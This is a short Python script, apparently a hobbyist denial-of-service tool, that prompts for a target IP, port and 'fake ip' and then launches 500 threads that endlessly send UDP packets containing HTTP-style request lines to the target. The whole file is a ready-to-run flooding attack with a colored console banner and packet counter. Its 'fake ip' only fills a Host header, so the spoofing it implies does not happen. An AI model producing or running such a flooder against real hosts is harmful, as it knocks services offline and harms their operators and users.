import threading
import banner
import socket
from colorama import Fore
print("THIS IS PAGE")
R = Fore.RED
Y = Fore.YELLOW
B = Fore.BLUE
RT = Fore.RESET
G = Fore.GREEN
C = Fore.CYAN

banner.show_banner()
target = input(f"{G}Enter ip: ")
port = int(input(f"{G}Enter port: "))
fake_ip = input(f"{G}Enter a fake ip [{Y}example: {B}40.51.10.2]{G}: {RT} ")
counter = 0

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global counter
        print(f'\t{G}[{B}*{G}]\t {G} Send {R} {counter} {G}package {RT}')
        counter += 1
        s.close()

	# if counter == 10000:
            # print(f'\t{G}[{B}*{G}]\t {G} Send {R} {counter} {G}package {RT}')
            # counter == 0
            # continue


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
